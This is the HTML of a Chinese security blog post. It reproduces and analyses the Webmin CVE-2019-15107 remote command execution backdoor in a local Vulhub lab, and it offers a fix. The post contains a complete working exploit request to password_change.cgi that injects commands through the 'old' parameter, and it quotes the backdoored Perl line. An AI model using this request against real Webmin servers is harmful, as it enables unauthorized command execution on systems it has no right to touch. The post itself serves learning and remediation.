@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web安全,Vulhub," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Webmin 远程命令执行漏洞（CVE-2019-15107）  漏洞复现首先是启动环境 12cd vulhub&#x2F;webmin&#x2F;CVE-2019-15107docker-compose up -d  然后访问 https:&#x2F;&#x2F;[localhost]:10000&#x2F;，一定要使用https，然后忽略证书，不然访问不了  因为在系统中找不到修改密码的入口，就直接使用例子给出的http报文了，其中有几点要">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulhub学习（三）">
+<meta property="og:url" content="http://yoursite.com/2020/07/20/Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/index.html">
+<meta property="og:site_name" content="Oah&#39;s Blog">
+<meta property="og:description" content="Webmin 远程命令执行漏洞（CVE-2019-15107）  漏洞复现首先是启动环境 12cd vulhub&#x2F;webmin&#x2F;CVE-2019-15107docker-compose up -d  然后访问 https:&#x2F;&#x2F;[localhost]:10000&#x2F;，一定要使用https，然后忽略证书，不然访问不了  因为在系统中找不到修改密码的入口，就直接使用例子给出的http报文了，其中有几点要">
+<meta property="og:image" content="http://yoursite.com/2020/07/20/Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/3311c747d122fe0c79e460eafea2f1b2.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/20/Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/d83b2d737debb6ef8a028befb5cf6cd2.png">
+<meta property="article:published_time" content="2020-07-20T01:51:35.000Z">
+<meta property="article:modified_time" content="2020-07-20T04:11:28.806Z">
+<meta property="article:author" content="Oah">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="Vulhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/07/20/Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/3311c747d122fe0c79e460eafea2f1b2.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/07/20/Vulhub学习（三）/"/>
+
+
+
+
+
+  <title>Vulhub学习（三） | Oah's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Oah's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/20/Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Oah">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Oah's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Vulhub学习（三）</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-20T09:51:35+08:00">
+                2020-07-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>Webmin 远程命令执行漏洞（CVE-2019-15107）</p>
+</blockquote>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先是启动环境</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/webmin/CVE-2019-15107</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>然后访问 <code>https://[localhost]:10000/</code>，一定要使用https，然后忽略证书，不然访问不了</p>
+<p><img src="Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/3311c747d122fe0c79e460eafea2f1b2.png" alt="img"></p>
+<p>因为在系统中找不到修改密码的入口，就直接使用例子给出的http报文了，其中有几点要注意</p>
+<ul>
+<li>Host和Referer中的ip地址要改成自己的</li>
+<li>post请求的user参数需要是一个不存在的用户</li>
+<li>执行的命令在old参数中，例子里给的值是 <code>test|id</code>，我发现不需要 <code>|</code> 也是可以执行的</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;password_change.cgi HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.241:10000</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: redirect&#x3D;1; testing&#x3D;1; sid&#x3D;x; sessiontest&#x3D;1</span><br><span class="line">Referer: https:&#x2F;&#x2F;192.168.1.241:10000&#x2F;session_login.cgi</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 60</span><br><span class="line"></span><br><span class="line">user&#x3D;rootxxgb&amp;pam&#x3D;&amp;expired&#x3D;2&amp;old&#x3D;whoami&amp;new1&#x3D;test2&amp;new2&#x3D;test2</span><br></pre></td></tr></table></figure>
+
+<p>发送数据包后，可以看到命令已被执行</p>
+<p><img src="Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/d83b2d737debb6ef8a028befb5cf6cd2.png" alt="img"></p>
+<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>下载 <a href="https://sourceforge.net/projects/webadmin/files/webmin/1.910/webmin-1.910.zip/download" target="_blank" rel="noopener">webmin-1.910</a>（杀毒软件会报存在后门）</p>
+<p>Webmin是用Perl写的，因为我从来没有写过Perl，所以只能边百度边审计</p>
+<h2 id="Perl语法"><a href="#Perl语法" class="headerlink" title="Perl语法"></a>Perl语法</h2><p>Perl可以用反引号 `` 包裹住字符串，反引号内的字符串会交给Shell执行</p>
+<p>qx运算符可以给字符串左右添加反引号，也就是使用Shell执行</p>
+<h2 id="路径跟踪"><a href="#路径跟踪" class="headerlink" title="路径跟踪"></a>路径跟踪</h2><p>首先找到漏洞触发点，在 <code>password_change.cgi</code> 文件的37~47行，如下</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($wuser) &#123;</span><br><span class="line">	<span class="comment"># Update Webmin user's password</span></span><br><span class="line">	$enc = &amp;acl::encrypt_password($in&#123;<span class="string">'old'</span>&#125;, $wuser-&gt;&#123;<span class="string">'pass'</span>&#125;);</span><br><span class="line">	$enc eq $wuser-&gt;&#123;<span class="string">'pass'</span>&#125; || &amp;pass_error($text&#123;<span class="string">'password_eold'</span>&#125;,<span class="keyword">qx</span>/$in&#123;<span class="string">'old'</span>&#125;/);</span><br><span class="line">	$perr = &amp;acl::check_password_restrictions($in&#123;<span class="string">'user'</span>&#125;, $in&#123;<span class="string">'new1'</span>&#125;);</span><br><span class="line">	$perr &amp;&amp; &amp;pass_error(&amp;text(<span class="string">'password_enewpass'</span>, $perr));</span><br><span class="line">	$wuser-&gt;&#123;<span class="string">'pass'</span>&#125; = &amp;acl::encrypt_password($in&#123;<span class="string">'new1'</span>&#125;);</span><br><span class="line">	$wuser-&gt;&#123;<span class="string">'temppass'</span>&#125; = <span class="number">0</span>;</span><br><span class="line">	&amp;acl::modify_user($wuser-&gt;&#123;<span class="string">'name'</span>&#125;, $wuser);</span><br><span class="line">	&amp;reload_miniserv();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>40行的 <code>qx/$in{&#39;old&#39;}/</code> 就是触发点，它会用Shell执行 <code>$in{old}</code> 变量的值</p>
+<p>要执行到这一步，需要满足 <code>$wuser</code> 为真。继续看前面的代码，寻找触发条件</p>
+<p>找到18~35行</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Is this a Webmin user?</span></span><br><span class="line"><span class="keyword">if</span> (&amp;foreign_check(<span class="string">"acl"</span>)) &#123;</span><br><span class="line">	&amp;foreign_require(<span class="string">"acl"</span>, <span class="string">"acl-lib.pl"</span>);</span><br><span class="line">	($wuser) = <span class="keyword">grep</span> &#123; $_-&gt;&#123;<span class="string">'name'</span>&#125; eq $in&#123;<span class="string">'user'</span>&#125; &#125; &amp;acl::list_users();</span><br><span class="line">	<span class="keyword">if</span> ($wuser-&gt;&#123;<span class="string">'pass'</span>&#125; eq <span class="string">'x'</span>) &#123;</span><br><span class="line">		<span class="comment"># A Webmin user, but using Unix authentication</span></span><br><span class="line">		$wuser = <span class="keyword">undef</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">elsif</span> ($wuser-&gt;&#123;<span class="string">'pass'</span>&#125; eq <span class="string">'*LK*'</span> ||</span><br><span class="line">	       $wuser-&gt;&#123;<span class="string">'pass'</span>&#125; =~ <span class="regexp">/^\!/</span>) &#123;</span><br><span class="line">		&amp;pass_error(<span class="string">"Webmin users with locked accounts cannot change "</span>.</span><br><span class="line">		       	    <span class="string">"their passwords!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">if</span> (!$in&#123;<span class="string">'pam'</span>&#125; &amp;&amp; !$wuser) &#123;</span><br><span class="line">	$miniserv&#123;<span class="string">'passwd_cindex'</span>&#125; <span class="keyword">ne</span> <span class="string">''</span> &amp;&amp; $miniserv&#123;<span class="string">'passwd_mindex'</span>&#125; <span class="keyword">ne</span> <span class="string">''</span> || </span><br><span class="line">		<span class="keyword">die</span> <span class="string">"Missing password file configuration"</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>$wuser</code> 变量在21行中被赋值，这行代码的大致意思是：获取用户列表，寻找是否存在跟 <code>$in{&#39;user&#39;}</code> 变量相同的用户名，如果有，赋值给 <code>$wuser</code> 变量</p>
+<p>在22~25行中，如果 <code>$wuser-&gt;{&#39;pass&#39;} eq &#39;x&#39;</code> 为真，会被赋值为 <code>undef</code>，就不能触发漏洞了</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">($wuser) = <span class="keyword">grep</span> &#123; $_-&gt;&#123;<span class="string">'name'</span>&#125; eq $in&#123;<span class="string">'user'</span>&#125; &#125; &amp;acl::list_users();</span><br></pre></td></tr></table></figure>
+
+<p>从这篇文章 <a href="https://paper.seebug.org/1019/" target="_blank" rel="noopener">Webmin(CVE-2019-15107) 远程代码执行漏洞之 backdoor 探究</a> 中得知，user是系统用户登陆且认证方式为Unix authenticaton的账户时，<code>$wuser-&gt;{&#39;pass&#39;} eq &#39;x&#39;</code> 为真。所以输入一个不存在的用户就可以触发漏洞了</p>
+<h1 id="Payload分析"><a href="#Payload分析" class="headerlink" title="Payload分析"></a>Payload分析</h1><p>由于这个漏洞是人为加上去的，没有需要绕过的地方，只要正常的写命令就可以执行了</p>
+<h1 id="如何修复"><a href="#如何修复" class="headerlink" title="如何修复"></a>如何修复</h1><p>将 <code>password_change.cgi</code> 文件40行的</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$enc eq $wuser-&gt;&#123;<span class="string">'pass'</span>&#125; || &amp;pass_error($text&#123;<span class="string">'password_eold'</span>&#125;,<span class="keyword">qx</span>/$in&#123;<span class="string">'old'</span>&#125;/);</span><br></pre></td></tr></table></figure>
+
+<p>改为</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$enc eq $wuser-&gt;&#123;<span class="string">'pass'</span>&#125; || &amp;pass_error($text&#123;<span class="string">'password_eold'</span>&#125;;</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://paper.seebug.org/1019/" target="_blank" rel="noopener">Webmin(CVE-2019-15107) 远程代码执行漏洞之 backdoor 探究</a></p>
+<p><a href="https://medium.com/@80vul/the-stories-behind-cve-2012-5159-198eaad2449d" target="_blank" rel="noopener">The stories behind Webmin CVE-2019–15107</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          
+            <a href="/tags/Vulhub/" rel="tag"># Vulhub</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/16/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BD%BF%E7%94%A8%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84v2ray%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/" rel="next" title="虚拟机使用宿主机的v2ray科学上网">
+                <i class="fa fa-chevron-left"></i> 虚拟机使用宿主机的v2ray科学上网
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/9999/09/09/%E8%B5%84%E6%BA%90%E6%94%B6%E8%97%8F/" rel="prev" title="【置顶】资源收藏">
+                【置顶】资源收藏 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Oah</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞复现"><span class="nav-number">1.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#源码分析"><span class="nav-number">2.</span> <span class="nav-text">源码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Perl语法"><span class="nav-number">2.1.</span> <span class="nav-text">Perl语法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#路径跟踪"><span class="nav-number">2.2.</span> <span class="nav-text">路径跟踪</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Payload分析"><span class="nav-number">3.</span> <span class="nav-text">Payload分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#如何修复"><span class="nav-number">4.</span> <span class="nav-text">如何修复</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考文章"><span class="nav-number">5.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Oah</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
